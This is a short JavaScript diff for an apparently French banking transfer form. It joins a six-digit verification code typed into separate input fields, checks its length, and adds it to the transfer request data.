@@ -73,6 +73,15 @@ function goToOtpStep() {
 }
 
 async function submitTunnelOtp() {
+  const inputs = document.querySelectorAll('#tunnel-step-otp .otp-input-real');
+  let pin_code = '';
+  inputs.forEach(input => pin_code += input.value);
+
+  if (pin_code.length !== 6) {
+    alert('Veuillez saisir votre code secret à 6 chiffres.');
+    return;
+  }
+
   // Show Loading step
   document.getElementById('tunnel-step-otp').style.display = 'none';
   document.getElementById('tunnel-step-loading').style.display = 'block';
@@ -83,7 +92,8 @@ async function submitTunnelOtp() {
     bic_dest: 'N/A',
     nom_dest: document.getElementById('vir-nom').value,
     montant: document.getElementById('vir-montant').value,
-    motif: document.getElementById('vir-motif').value
+    motif: document.getElementById('vir-motif').value,
+    pin_code: pin_code
   };
 
   try {
